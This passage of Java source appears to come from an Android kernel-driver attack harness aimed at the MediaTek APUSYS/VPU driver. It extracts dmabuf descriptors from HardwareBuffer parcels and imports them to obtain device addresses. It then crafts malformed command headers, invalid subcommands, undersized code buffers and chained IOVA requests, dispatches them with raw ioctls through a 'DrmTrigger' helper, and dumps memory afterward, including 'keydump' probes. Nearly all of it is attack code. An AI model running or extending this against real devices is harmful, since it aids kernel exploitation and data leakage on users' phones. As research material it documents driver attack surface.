        runOneUcmdHardwareBufferProbe(apusysFd,
            "keydump_" + sanitizeLabel(key), 0x8001, key, true);
    }

    private static void runOneUcmdHardwareBufferProbe(int apusysFd, String label,
                                                      int firstU32) throws Exception {
        runOneUcmdHardwareBufferProbe(apusysFd, label, firstU32, null);
    }

    private static void runOneUcmdHardwareBufferProbe(int apusysFd, String label,
                                                      int firstU32, String key)
            throws Exception {
        runOneUcmdHardwareBufferProbe(apusysFd, label, firstU32, key, false);
    }

    private static void runOneUcmdHardwareBufferProbe(int apusysFd, String label,
                                                      int firstU32, String key,
                                                      boolean dumpPayload)
            throws Exception {
        System.out.println("\n[*] --- ucmd HardwareBuffer case: " + label
            + " first_u32=0x" + Integer.toHexString(firstU32)
            + (key == null ? "" : " key=\"" + key + "\"")
            + " ---");

        android.media.ImageReader reader = null;
        android.media.ImageWriter writer = null;
        android.media.Image input = null;
        android.media.Image output = null;
        android.hardware.HardwareBuffer hb = null;
        try {
            reader = createRgbaImageReader(64, 64);
            System.out.println("[+] ImageReader created: width=" + reader.getWidth()
                + " height=" + reader.getHeight()
                + " format=" + reader.getImageFormat()
                + " hbFormat=" + reader.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(reader.getUsage()));

            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
            System.out.println("[+] ImageWriter created: width=" + writer.getWidth()
                + " height=" + writer.getHeight()
                + " format=" + writer.getFormat()
                + " hbFormat=" + writer.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(writer.getUsage()));

            input = writer.dequeueInputImage();
            fillImageHeader(input, firstU32, key);
            writer.queueInputImage(input);
            input = null;

            output = acquireImage(reader);
            if (output == null) {
                System.out.println("[-] ImageReader did not produce an output image");
                return;
            }

            hb = output.getHardwareBuffer();
            if (hb == null) {
                System.out.println("[-] Image.getHardwareBuffer returned null");
                return;
            }

            System.out.println("[+] Output HardwareBuffer:"
                + " width=" + optionalIntMethod(hb, "getWidth")
                + " height=" + optionalIntMethod(hb, "getHeight")
                + " format=" + optionalIntMethod(hb, "getFormat")
                + " layers=" + optionalIntMethod(hb, "getLayers")
                + " usage=" + optionalLongMethod(hb, "getUsage"));
            probeHardwareBufferParcel(apusysFd, hb, true, false,
                "hwb_" + label, dumpPayload ? output : null);
        } catch (Throwable t) {
            System.out.println("[-] ucmd HardwareBuffer case " + label
                + " failed: " + shortThrowable(t));
        } finally {
            if (hb != null) {
                hb.close();
            }
            if (output != null) {
                output.close();
            }
            if (input != null) {
                input.close();
            }
            if (writer != null) {
                writer.close();
            }
            if (reader != null) {
                reader.close();
            }
        }
    }

    private static void runRunCmdHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd HardwareBuffer parser probe ===");
        System.out.println("[*] Mode: write zero header through ImageWriter,"
            + " import HardwareBuffer fd, then call run_cmd_async only");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "zero", 0);
    }

    private static void runRunCmdInvalidScHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd invalid-subcommand parser probe ===");
        System.out.println("[*] Mode: valid APUSYS command header, one invalid"
            + " subcommand type, no provider request");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "invalid_sc_type20", 0,
            RUN_CMD_PAYLOAD_INVALID_SC);
    }

    private static void runRunCmdVpuGuardHardwareBufferProbe(int apusysFd)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd VPU request-guard probe ===");
        System.out.println("[*] Mode: valid APUSYS command header, normal VPU"
            + " subcommand type, intentionally short codebuf size, no VPU execute");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "vpu_guard_size20", 0,
            RUN_CMD_PAYLOAD_VPU_GUARD);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, 3000);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs)
            throws Exception {
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, xrpSettings,
            splitTargets, xrpOp, waitMs, false);
    }

    private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
                                                            boolean dispatch,
                                                            boolean xrpSettings,
                                                            boolean splitTargets,
                                                            XrpOpSpec xrpOp,
                                                            int waitMs,
                                                            boolean twoVpuBuffers)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd VPU IOVA chained probe ===");
        if (xrpSettings) {
            System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
                + " writes a libneuron-style XRP settings buffer into that IOVA,"
                + " then the VPU request references settings/output/data sections.");
            if (splitTargets) {
                System.out.println("[*] Split target: XRP data descriptor and"
                    + " native VPU plane0 MVA point at different IOVA offsets.");
            }
            if (xrpOp.hasCode()) {
                System.out.println("[*] Nonzero XRP code section: opcode="
                    + xrpOp.opcode + " name=" + xrpOp.name
                    + " op_size=0x"
                    + Integer.toHexString(XRP_CODE_OP_SIZE)
                    + " inputs=" + xrpOp.inputCount
                    + " outputs=" + xrpOp.outputCount
                    + " operands=" + xrpOperandListText(xrpOp));
            }
            if (twoVpuBuffers) {
                System.out.println("[*] Native VPU descriptor mode:"
                    + " buffer_count=2, buf0 plane points to XRP code/input,"
                    + " buf1 plane points to XRP output.");
            }
        } else {
            System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
                + " then the VPU request references that IOVA in libvpu-style"
                + " settings and plane descriptors.");
        }
        if (!dispatch) {
            System.out.println("[*] Control: command buffer is imported but"
                + " run_cmd_async is skipped before the original buffer dump.");
        }

        loadRuntimeLibraries();

        android.media.ImageReader reader = null;
        android.media.ImageWriter writer = null;
        android.media.Image input = null;
        android.media.Image output = null;
        android.hardware.HardwareBuffer hb = null;
        long memDesc = 0;
        boolean memImported = false;
        try {
            reader = createRgbaImageReader(64, 64);
            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
            input = writer.dequeueInputImage();

            // phase 1: write a zero payload first, just to get the HardwareBuffer fd
            fillImageHeader(input, 0);
            writer.queueInputImage(input);
            input = null;

            output = acquireImage(reader);
            if (output == null) {
                System.out.println("[-] ImageReader did not produce an output image");
                return;
            }
            hb = output.getHardwareBuffer();
            if (hb == null) {
                System.out.println("[-] Image.getHardwareBuffer returned null");
                return;
            }

            // phase 2: extract dmabuf fd from parcel at known offset 388
            android.os.Parcel parcel = android.os.Parcel.obtain();
            int dmaBufFd = -1;
            try {
                hb.writeToParcel(parcel, 0);
                parcel.setDataPosition(388);
                android.os.ParcelFileDescriptor pfd = parcel.readFileDescriptor();
                if (pfd != null) {
                    dmaBufFd = pfd.getFd();
                }
            } finally {
                parcel.recycle();
            }
            if (dmaBufFd < 0) {
                System.out.println("[-] Could not extract dmabuf fd from parcel pos 388");
                return;
            }
            System.out.println("[+] dmabuf fd=" + dmaBufFd);

            // phase 3: mem_create type-2 to import and get IOVA — do NOT free yet
            memDesc = DrmTrigger.sScratchBuf + OFF_MEM_DMABUF;
            DrmTrigger.zeroMem(memDesc, 0x38);
            DrmTrigger.unsafePutInt(memDesc + 0x0c, 0x4000);  // size
            DrmTrigger.unsafePutInt(memDesc + 0x18, 0);        // mem type
            DrmTrigger.unsafePutInt(memDesc + 0x20, dmaBufFd); // fd

            long memRet = DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_CREATE2, memDesc);
            System.out.println("[*] mem_create2_iova cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
                + " ret=" + retText(memRet));
            if (memRet < 0) {
                System.out.println("[-] mem_create2 failed, cannot get IOVA");
                return;
            }
            memImported = true;
            dumpU32Words("mem_create2_iova_desc", memDesc, 0x38);

            int iovaLow = DrmTrigger.unsafeGetInt(memDesc + 0x08);
            int iovaSize = DrmTrigger.unsafeGetInt(memDesc + 0x0c);
            long memId = DrmTrigger.unsafeGetLong(memDesc + 0x28);
            System.out.println("[+] IOVA=0x" + Integer.toHexString(iovaLow)
                + " size=0x" + Integer.toHexString(iovaSize)
                + " mem_id=0x" + Long.toHexString(memId));

            if (xrpSettings) {
                android.media.Image.Plane[] planes = output.getPlanes();
                if (planes == null || planes.length == 0) {
                    System.out.println("[-] original output image has no planes");
                    return;
                }
                java.nio.ByteBuffer originalBuf = planes[0].getBuffer();
                fillXrpSettingsBuffer(originalBuf, iovaLow, iovaSize, xrpOp);
                dumpXrpWindows("before", originalBuf, xrpOp);
            }

            // phase 4: now build a second HardwareBuffer with the VPU+IOVA payload.
            // Keep the first output/hardware buffer alive so its plane can be
            // dumped after execution; mem_create holds the kernel-side mapping.
            android.media.ImageReader reader2 = createRgbaImageReader(64, 64);
            android.media.ImageWriter writer2
                = android.media.ImageWriter.newInstance(reader2.getSurface(), 2);
            android.media.Image input2 = writer2.dequeueInputImage();
            if (xrpSettings) {
                String label;
                if (xrpOp.hasCode()) {
                    label = twoVpuBuffers
                        ? "vpu_xrp_internal_" + xrpOp.label + "_iova_apunn"
                        : "vpu_xrp_" + xrpOp.label + "_iova_apunn";
                } else {
                    label = splitTargets ? "vpu_xrp_split_iova_apunn"
                        : "vpu_xrp_iova_apunn";
                }
                fillRunCmdVpuXrpIova(input2, "apu_lib_apunn", label,
                    iovaLow, iovaSize, splitTargets, xrpOp, twoVpuBuffers);
            } else {
                fillRunCmdVpuIova(input2, "apu_lib_apunn", "vpu_iova_apunn",
                    iovaLow, iovaSize);
            }
            writer2.queueInputImage(input2);

            android.media.Image output2 = acquireImage(reader2);
            if (output2 == null) {
                System.out.println("[-] second ImageReader produced no image");
                writer2.close();
                reader2.close();
                return;
            }
            android.hardware.HardwareBuffer hb2 = output2.getHardwareBuffer();
            if (hb2 == null) {
                System.out.println("[-] second HardwareBuffer is null");
                output2.close();
                writer2.close();
                reader2.close();
                return;
            }

            // phase 5: extract fd and run_cmd_async with IOVA-referencing payload
            android.os.Parcel p2 = android.os.Parcel.obtain();
            int cmdFd = -1;
            try {
                hb2.writeToParcel(p2, 0);
                p2.setDataPosition(388);
                android.os.ParcelFileDescriptor pfd2 = p2.readFileDescriptor();
                if (pfd2 != null) {
                    cmdFd = pfd2.getFd();
                }
            } finally {
                p2.recycle();
            }
            if (cmdFd < 0) {
                System.out.println("[-] Could not extract cmd dmabuf fd");
                hb2.close();
                output2.close();
                writer2.close();
                reader2.close();
                return;
            }
            System.out.println("[+] cmd dmabuf fd=" + cmdFd);

            // mem_create for the cmd buffer itself
            long cmdMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
            DrmTrigger.zeroMem(cmdMemDesc, 0x38);
            DrmTrigger.unsafePutInt(cmdMemDesc + 0x0c, 0x4000);
            DrmTrigger.unsafePutInt(cmdMemDesc + 0x18, 0);
            DrmTrigger.unsafePutInt(cmdMemDesc + 0x20, cmdFd);
            long cmdMemRet = DrmTrigger.rawIoctl(apusysFd,
                APUSYS_CMD_MEM_CREATE2, cmdMemDesc);
            System.out.println("[*] mem_create2_cmd cmd=0x"
                + Long.toHexString(APUSYS_CMD_MEM_CREATE2)
                + " ret=" + retText(cmdMemRet));
            if (cmdMemRet < 0) {
                System.out.println("[-] cmd mem_create2 failed");
                hb2.close();
                output2.close();
                writer2.close();
                reader2.close();
                return;
            }
            dumpU32Words("mem_create2_cmd_desc", cmdMemDesc, 0x38);
            if (xrpSettings) {
                android.media.Image.Plane[] cmdPlanes = output2.getPlanes();
                if (cmdPlanes != null && cmdPlanes.length > 0) {
                    dumpVpuCommandWindows("before", cmdPlanes[0].getBuffer());
                }
            }

            // run_cmd_async
            long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
            DrmTrigger.zeroMem(runCmd, 0x18);
            DrmTrigger.unsafePutInt(runCmd + 0x08, cmdFd);
            DrmTrigger.unsafePutInt(runCmd + 0x10, 0x4000);
            if (dispatch) {
                long runRet = DrmTrigger.rawIoctl(apusysFd,
                    APUSYS_CMD_RUN_ASYNC, runCmd);
                System.out.println("[*] run_async_vpu_iova cmd=0x"
                    + Long.toHexString(APUSYS_CMD_RUN_ASYNC)
                    + " ret=" + retText(runRet));
            } else {
                System.out.println("[*] run_async_vpu_iova skipped by control mode");
            }

            // wait a bit for VPU timeout / completion
            System.out.println("[*] Waiting " + waitMs
                + "ms before original buffer dump...");
            Thread.sleep(waitMs);

            // dump the original imported buffer to see if VPU wrote anything back
            System.out.println("[*] Dumping original IOVA buffer post-execution:");
            if (output != null) {
                android.media.Image.Plane[] planes = output.getPlanes();
                if (planes != null && planes.length > 0) {
                    java.nio.ByteBuffer buf = planes[0].getBuffer();
                    if (xrpSettings) {
                        dumpXrpWindows("after", buf, xrpOp);
                    } else {
                        dumpByteBuffer("original_iova_buf", buf, 0x80);
                    }
                }
            }
            if (xrpSettings && output2 != null) {
                android.media.Image.Plane[] cmdPlanes = output2.getPlanes();
                if (cmdPlanes != null && cmdPlanes.length > 0) {
                    System.out.println("[*] Dumping command buffer post-execution:");
                    dumpVpuCommandWindows("after", cmdPlanes[0].getBuffer());
                }
            }

            // cleanup cmd mem
            DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_FREE_02, cmdMemDesc);
            System.out.println("[*] cmd mem_create2 freed");

            hb2.close();
            output2.close();
            writer2.close();
            reader2.close();

        } finally {
            // phase 6: cleanup IOVA mem
            if (memImported) {
                DrmTrigger.rawIoctl(apusysFd, APUSYS_CMD_MEM_FREE_02, memDesc);
                System.out.println("[*] IOVA mem_create2 freed");
            }
            if (hb != null) hb.close();
            if (output != null) output.close();
            if (input != null) input.close();
            if (writer != null) writer.close();
            if (reader != null) reader.close();
        }
    }

    private static void runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(
            int apusysFd, boolean dispatch) throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP internal-buffer probe ===");
        System.out.println("[*] Mode: split-target ANN_VERSION request with"
            + " two native VPU buffer descriptors, matching the host"
            + " PrepareInternalCommandBuffer() code/output binding shape.");
        if (!dispatch) {
            System.out.println("[*] Control: imports the buffers but skips"
                + " run_cmd_async.");
        }
        printXrpCaseBanner("internal two-buffer case", XRP_OP_ANN_VERSION);
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
            XRP_OP_ANN_VERSION, 20000, true);
    }

    private static void runRunCmdVpuXrpOpMatrixHardwareBufferProbe(int apusysFd,
                                                                   boolean dispatch)
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP opcode matrix ===");
        System.out.println("[*] Mode: repeated split-target IOVA probes using"
            + " a small internal-query opcode whitelist; each case keeps the"
            + " APUNN data descriptor separate from native VPU plane0 MVA.");
        if (!dispatch) {
            System.out.println("[*] Control: each case imports the buffers but"
                + " skips run_cmd_async.");
        }
        for (int i = 0; i < XRP_OP_MATRIX.length; i++) {
            XrpOpSpec spec = XRP_OP_MATRIX[i];
            printXrpCaseBanner("matrix case " + (i + 1)
                + "/" + XRP_OP_MATRIX.length, spec);
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                spec);
        }
    }

    private static void runRunCmdVpuXrpOpCaseHardwareBufferProbe(int apusysFd,
                                                                 boolean dispatch,
                                                                 XrpOpSpec spec)
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU APUNN/XRP opcode case ===");
        System.out.println("[*] Mode: single split-target IOVA probe for one"
            + " internal-query opcode shape.");
        if (!dispatch) {
            System.out.println("[*] Control: imports the buffers but skips"
                + " run_cmd_async.");
        }
        printXrpCaseBanner("single case", spec);
        runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
            spec, 20000);
    }

    private static void printXrpCaseBanner(String prefix, XrpOpSpec spec) {
        System.out.println("\n[*] --- XRP " + prefix
            + ": " + spec.label
            + " opcode=" + spec.opcode + " name=" + spec.name
            + " inputs=" + spec.inputCount
            + " outputs=" + spec.outputCount
            + " operands=" + xrpOperandListText(spec)
            + " time_ms=" + System.currentTimeMillis() + " ---");
    }

    private static void runRunCmdVpuExecHardwareBufferProbe(int apusysFd)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS run_cmd VPU full-size exec probe ===");
        System.out.println("[*] Mode: valid APUSYS command header, normal VPU"
            + " subcommand type, 0xb70 codebuf with apu_lib_apunn algo name,"
            + " flags=0, buffer_count=0. Expects real VPU hw dispatch or timeout.");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneRunCmdHardwareBufferProbe(apusysFd, "vpu_exec_apunn", 0,
            RUN_CMD_PAYLOAD_VPU_EXEC);
    }

    private static void runOneRunCmdHardwareBufferProbe(int apusysFd, String label,
                                                        int firstU32) throws Exception {
        runOneRunCmdHardwareBufferProbe(apusysFd, label, firstU32,
            RUN_CMD_PAYLOAD_ZERO);
    }

    private static void runOneRunCmdHardwareBufferProbe(int apusysFd, String label,
                                                        int firstU32,
                                                        int payloadMode)
            throws Exception {
        System.out.println("\n[*] --- run_cmd HardwareBuffer case: " + label
            + " first_u32=0x" + Integer.toHexString(firstU32)
            + " payload_mode=" + payloadMode
            + " ---");

        android.media.ImageReader reader = null;
        android.media.ImageWriter writer = null;
        android.media.Image input = null;
        android.media.Image output = null;
        android.hardware.HardwareBuffer hb = null;
        try {
            reader = createRgbaImageReader(64, 64);
            System.out.println("[+] ImageReader created: width=" + reader.getWidth()
                + " height=" + reader.getHeight()
                + " format=" + reader.getImageFormat()
                + " hbFormat=" + reader.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(reader.getUsage()));

            writer = android.media.ImageWriter.newInstance(reader.getSurface(), 2);
            System.out.println("[+] ImageWriter created: width=" + writer.getWidth()
                + " height=" + writer.getHeight()
                + " format=" + writer.getFormat()
                + " hbFormat=" + writer.getHardwareBufferFormat()
                + " usage=0x" + Long.toHexString(writer.getUsage()));

            input = writer.dequeueInputImage();
            if (payloadMode == RUN_CMD_PAYLOAD_INVALID_SC) {
                fillRunCmdSubcommand(input, 0x20, 0, 0x60,
                    "invalid_sc_type20");
            } else if (payloadMode == RUN_CMD_PAYLOAD_VPU_GUARD) {
                fillRunCmdSubcommand(input, 0x03, 0x20, 0x60,
                    "vpu_guard_type3_size20");
            } else if (payloadMode == RUN_CMD_PAYLOAD_VPU_EXEC) {
                fillRunCmdVpuExec(input, "apu_lib_apunn",
                    "vpu_exec_apunn");
            } else {
                fillImageHeader(input, firstU32);
            }
            writer.queueInputImage(input);
            input = null;

            output = acquireImage(reader);
            if (output == null) {
                System.out.println("[-] ImageReader did not produce an output image");
                return;
            }

            hb = output.getHardwareBuffer();
            if (hb == null) {
                System.out.println("[-] Image.getHardwareBuffer returned null");
                return;
            }

            System.out.println("[+] Output HardwareBuffer:"
                + " width=" + optionalIntMethod(hb, "getWidth")
                + " height=" + optionalIntMethod(hb, "getHeight")
                + " format=" + optionalIntMethod(hb, "getFormat")
                + " layers=" + optionalIntMethod(hb, "getLayers")
                + " usage=" + optionalLongMethod(hb, "getUsage"));
            probeHardwareBufferParcel(apusysFd, hb, false, true, "hwb_run_" + label);
        } catch (Throwable t) {
            System.out.println("[-] run_cmd HardwareBuffer case " + label
                + " failed: " + shortThrowable(t));
        } finally {
            if (hb != null) {
                hb.close();
            }
            if (output != null) {
                output.close();
            }
            if (input != null) {
                input.close();
            }
            if (writer != null) {
                writer.close();
            }
            if (reader != null) {
                reader.close();
            }
        }
    }

    private static android.media.ImageReader createRgbaImageReader(int width, int height) {
        long usage = android.hardware.HardwareBuffer.USAGE_CPU_READ_OFTEN
            | android.hardware.HardwareBuffer.USAGE_CPU_WRITE_OFTEN
            | android.hardware.HardwareBuffer.USAGE_GPU_SAMPLED_IMAGE;
        try {
            return android.media.ImageReader.newInstance(
                width, height, android.graphics.PixelFormat.RGBA_8888, 3, usage);
        } catch (Throwable t) {
            System.out.println("[-] ImageReader usage create failed, retrying default usage: "
                + shortThrowable(t));
            return android.media.ImageReader.newInstance(
                width, height, android.graphics.PixelFormat.RGBA_8888, 3);
        }
    }

    private static void fillImageHeader(android.media.Image image, int firstU32)
            throws Exception {
        fillImageHeader(image, firstU32, null);
    }

    private static void fillImageHeader(android.media.Image image, int firstU32,
                                        String key) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x1000 ? buffer.capacity() : 0x1000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }
        buffer.put(0, (byte) (firstU32 & 0xff));
        buffer.put(1, (byte) ((firstU32 >>> 8) & 0xff));
        buffer.put(2, (byte) ((firstU32 >>> 16) & 0xff));
        buffer.put(3, (byte) ((firstU32 >>> 24) & 0xff));
        int keyBytes = 0;
        if (key != null) {
            byte[] bytes = key.getBytes("US-ASCII");
            keyBytes = bytes.length < 0x1f ? bytes.length : 0x1f;
            for (int i = 0; i < keyBytes; i++) {
                buffer.put(4 + i, bytes[i]);
            }
        }
        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input image payload: first_u32=0x"
            + Integer.toHexString(firstU32)
            + (key == null ? "" : " key_bytes=" + keyBytes)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillRunCmdVpuIova(android.media.Image image,
                                          String algoName,
                                          String label,
                                          int iovaAddr,
                                          int iovaSize) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int codebufOffset = 0x60;
        int codebufSize = 0xb70;
        int totalNeeded = codebufOffset + codebufSize;
        if (buffer.capacity() < totalNeeded) {
            throw new IllegalStateException("input image too small: need 0x"
                + Integer.toHexString(totalNeeded) + " have "
                + buffer.capacity());
        }

        // APUSYS command header — same as fillRunCmdVpuExec
        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);       // version
        buffer.put(0x11, (byte) 0);       // priority
        putU64LE(buffer, 0x18, 0);        // flags
        putU32LE(buffer, 0x20, 1);        // num_sc
        putU32LE(buffer, 0x24, 0x5c);     // ofs_scr_list
        putU32LE(buffer, 0x28, 0x58);     // ofs_pdr_cnt_list
        putU32LE(buffer, 0x2c, 0x30);     // sc0 offset

        // Subcommand at 0x30 — normal VPU type
        int scOff = 0x30;
        putU32LE(buffer, scOff + 0x00, 0x03);  // type = normal VPU
        putU32LE(buffer, scOff + 0x20, codebufSize);     // cb_info_size
        putU32LE(buffer, scOff + 0x24, codebufOffset);   // ofs_cb_info
        putU32LE(buffer, 0x58, 0);        // pdr_cnt_list[0]
        putU32LE(buffer, 0x5c, 0);        // scr_list[0]

        // VPU request at codebufOffset (0x60): 0xb70 bytes
        int reqBase = codebufOffset;

        // +0x04: algo name
        byte[] nameBytes = algoName.getBytes("US-ASCII");
        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
        for (int i = 0; i < nameLen; i++) {
            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
        }

        // +0x28: flags = 0 (walk vpu_execute, not vpu_execute_with_slot)
        // +0x35: buffer_count. libvpu::addBuffer() increments this byte and
        // vpu_req_check bounds it to < 0x21.
        buffer.put(reqBase + 0x35, (byte) 1);

        // libvpu::prepareSettBuf() writes setting length at request+0x38
        // and setting IOVA/MVA at request+0x40. The setting payload content
        // is still just the imported HardwareBuffer bytes in this probe.
        putU32LE(buffer, reqBase + 0x38, iovaSize);
        putU64LE(buffer, reqBase + 0x40, iovaAddr & 0xffffffffL);

        // libvpu::addBuffer() uses one 0x40-byte descriptor per buffer at
        // request+0x50. For each plane, mmapMVA() normally fills +0x68 with
        // the imported MVA. Because this probe bypasses libvpu, place the
        // already returned APUSYS IOVA directly in plane0_mva.
        int buf0 = reqBase + 0x50;
        buffer.put(buf0 + 0x00, (byte) 0);      // port id / buffer tag
        buffer.put(buf0 + 0x01, (byte) 0);      // buffer kind/direction
        buffer.put(buf0 + 0x02, (byte) 1);      // plane_count
        putU32LE(buffer, buf0 + 0x04, iovaSize);
        putU32LE(buffer, buf0 + 0x08, 0);
        putU32LE(buffer, buf0 + 0x10, 0);       // plane0 offset/ptr low
        putU32LE(buffer, buf0 + 0x14, iovaSize);
        putU64LE(buffer, buf0 + 0x18, iovaAddr & 0xffffffffL);

        image.setTimestamp(System.nanoTime());
        System.out.println("[+] input run_cmd " + label + " payload:"
            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
            + " sc0_off=0x30 sc0_type=0x3"
            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
            + " algo=" + algoName
            + " req_buffer_count=1"
            + " iova=0x" + Integer.toHexString(iovaAddr)
            + " iova_size=0x" + Integer.toHexString(iovaSize)
            + " setting_len_at=0x" + Integer.toHexString(reqBase + 0x38)
            + " setting_iova_at=0x" + Integer.toHexString(reqBase + 0x40)
            + " plane0_mva_at=0x" + Integer.toHexString(buf0 + 0x18)
            + " plane_count=" + planes.length
            + " cap=" + buffer.capacity()
            + " rowStride=" + planes[0].getRowStride()
            + " pixelStride=" + planes[0].getPixelStride());
    }

    private static void fillRunCmdVpuXrpIova(android.media.Image image,
                                             String algoName,
                                             String label,
                                             int iovaAddr,
                                             int iovaSize,
                                             boolean splitTargets,
                                             XrpOpSpec xrpOp,
                                             boolean twoVpuBuffers) throws Exception {
        android.media.Image.Plane[] planes = image.getPlanes();
        if (planes == null || planes.length == 0) {
            throw new IllegalStateException("input image has no planes");
        }
        java.nio.ByteBuffer buffer = planes[0].getBuffer();
        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
        for (int i = 0; i < clearLen; i++) {
            buffer.put(i, (byte) 0);
        }

        int dataPayloadOff = xrpDataPayloadOff(xrpOp);
        int planePayloadOff = splitTargets
            ? xrpPlanePayloadOff(xrpOp) : dataPayloadOff;
        int requiredIovaBytes = planePayloadOff + XRP_PLANE_PAYLOAD_SIZE;
        if (iovaSize < requiredIovaBytes) {
            throw new IllegalStateException("imported IOVA too small: need 0x"
                + Integer.toHexString(requiredIovaBytes) + " have 0x"
                + Integer.toHexString(iovaSize));
        }

        int codebufOffset = 0x60;
        int codebufSize = 0xb70;
        int totalNeeded = codebufOffset + codebufSize;
        if (buffer.capacity() < totalNeeded) {
            throw new IllegalStateException("input image too small: need 0x"
                + Integer.toHexString(totalNeeded) + " have "
                + buffer.capacity());
        }

        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
        buffer.put(0x10, (byte) 1);
        buffer.put(0x11, (byte) 0);
        putU64LE(buffer, 0x18, 0);
        putU32LE(buffer, 0x20, 1);
        putU32LE(buffer, 0x24, 0x5c);
        putU32LE(buffer, 0x28, 0x58);
        putU32LE(buffer, 0x2c, 0x30);

        int scOff = 0x30;
        putU32LE(buffer, scOff + 0x00, 0x03);
        putU32LE(buffer, scOff + 0x20, codebufSize);
        putU32LE(buffer, scOff + 0x24, codebufOffset);
        putU32LE(buffer, 0x58, 0);
        putU32LE(buffer, 0x5c, 0);

        int reqBase = codebufOffset;
        byte[] nameBytes = algoName.getBytes("US-ASCII");
        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
        for (int i = 0; i < nameLen; i++) {
            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
        }

        int reqBufferCount = twoVpuBuffers ? 2 : 1;
        buffer.put(reqBase + 0x35, (byte) reqBufferCount);
        putU32LE(buffer, reqBase + 0x38, XRP_SETTINGS_LEN);
        putU64LE(buffer, reqBase + 0x40, iovaLow32(iovaAddr, XRP_SETTINGS_OFF));

        int buf0 = reqBase + 0x50;
        buffer.put(buf0 + 0x00, (byte) 0);
        buffer.put(buf0 + 0x01, (byte) 0);
        buffer.put(buf0 + 0x02, (byte) 1);
        int buf0PayloadOff = twoVpuBuffers ? XRP_CODE_OFF : planePayloadOff;
        int buf0PayloadSize = twoVpuBuffers
            ? (xrpOp.hasCode() ? XRP_CODE_OP_SIZE : XRP_SETTINGS_LEN)
            : (splitTargets ? XRP_PLANE_PAYLOAD_SIZE : XRP_DATA_PAYLOAD_SIZE);
        putU32LE(buffer, buf0 + 0x04, buf0PayloadSize);
        putU32LE(buffer, buf0 + 0x08, 0);
        putU32LE(buffer, buf0 + 0x10, 0);
        putU32LE(buffer, buf0 + 0x14, buf0PayloadSize);
        putU64LE(buffer, buf0 + 0x18, iovaLow32(iovaAddr, buf0PayloadOff));

